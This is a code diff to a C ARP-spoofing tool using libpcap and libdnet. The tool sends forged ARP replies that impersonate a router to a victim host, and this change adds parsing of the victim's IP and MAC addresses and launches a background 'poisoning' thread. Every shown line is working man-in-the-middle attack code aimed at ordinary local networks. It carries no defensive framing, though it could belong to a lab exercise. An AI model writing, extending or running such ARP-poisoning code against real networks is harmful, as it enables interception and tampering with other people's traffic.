@@ -4,7 +4,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-
+#include <pthread.h>
 #include <string.h> // for eth_pack_hdr which uses memmove
 
 #ifdef DNET_NAME
@@ -18,6 +18,12 @@
 extern pcap_t *handle;
 extern eth_addr_t my_mac_addr;
 extern eth_addr_t victim_mac_addr;
+ip_addr_t router_ip_addr;
+ip_addr_t my_ip_addr;
+ip_addr_t victim_ip_addr;
+
+unsigned char startup = 1;
+pthread_t po_thread;
 
 struct arp_response {
 	struct eth_hdr ethernet_header;
@@ -41,7 +47,7 @@ void arp_answer(eth_addr_t victim_mac, uint8_t *victim_ip, uint8_t *router_ip) {
 
 	eth_pack_hdr(&packet.ethernet_header, victim_mac, my_mac_addr, ETH_TYPE_ARP);
 	arp_pack_hdr_ethip(&packet.arp_header, ARP_OP_REPLY, my_mac_addr, router_ip2, victim_mac, victim_ip2);
-	
+
 	ret = pcap_sendpacket(handle, (u_char *)&packet, sizeof(struct arp_response));
 	if (ret < 0) {
 		printf("ERROR : failed to send the forged arp answer !\n");
@@ -80,13 +86,13 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	struct eth_hdr eth_pack;
 	eth_addr_t router_mac_addr;
 	uint16_t type;
-	ip_addr_t router_ip_addr;
-	ip_addr_t my_ip_addr;
 	char *my_ip_string;
 	char *arguments = strdup((char *)args);
 	char *ip_router_string;
 	char *mac_router_string;
-	char *my_mac;
+	char *my_mac_string;
+	char *victim_ip_string;
+	char *victim_mac_string;
 	eth_addr_t null_addr;
 
 	memset(&null_addr, 0x0, ETH_ADDR_LEN);
@@ -94,8 +100,10 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	// We retrieve the mac & ip address of the router (as strings)
 	ip_router_string = strtok(arguments, ";");
 	mac_router_string = strtok(NULL, ";");
-	my_mac = strtok(NULL, ";");
 	my_ip_string = strtok(NULL, ";");
+	my_mac_string = strtok(NULL, ";");
+	victim_ip_string = strtok(NULL, ";");
+	victim_mac_string = strtok(NULL, ";");
 
 	if (ip_router_string == NULL) {
 		printf("ip_router_string == NULL\n");
@@ -107,7 +115,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		exit(1);
 	}
 
-	if (my_mac == NULL) {
+	if (my_mac_string == NULL) {
 		printf("my_mac == NULL\n");
 		exit(1);
 	}
@@ -117,11 +125,24 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		exit(1);
 	}
 
+	if (victim_ip_string == NULL)
+	{
+		printf("victim_ip_string == NULL\n");
+		exit(1);
+	}
+
+	if (victim_mac_string == NULL)
+	{
+		printf("victim_mac_string == NULL\n");
+		exit(1);
+	}
+
 	// We translate the strings into real addresses
 	string_to_mac_addr(mac_router_string, &router_mac_addr);
 	string_to_ip_addr(ip_router_string, &router_ip_addr);
-	string_to_mac_addr(my_mac, &my_mac_addr);
+	string_to_mac_addr(my_mac_string, &my_mac_addr);
 	string_to_ip_addr(my_ip_string, &my_ip_addr);
+	string_to_ip_addr(victim_ip_string, &victim_ip_addr);
 
 	free(arguments);
 
@@ -138,6 +159,19 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	print_mac_address(eth_pack.eth_dst);
 	printf(" ; type : %04X\n", type);
 */
+
+	if (startup)
+	{
+		int err;
+		err = pthread_create(&po_thread, NULL, poisoning_thread, NULL);
+		if (err != 0)
+		{
+			printf("Error creating the poisoning thread : %d\n", err);
+			exit(1);
+		}
+		startup = 0;
+	}
+
 	if (type == ETH_TYPE_ARP) {
 		struct arp_hdr arp_header;
 		struct arp_ethip arp_payload;
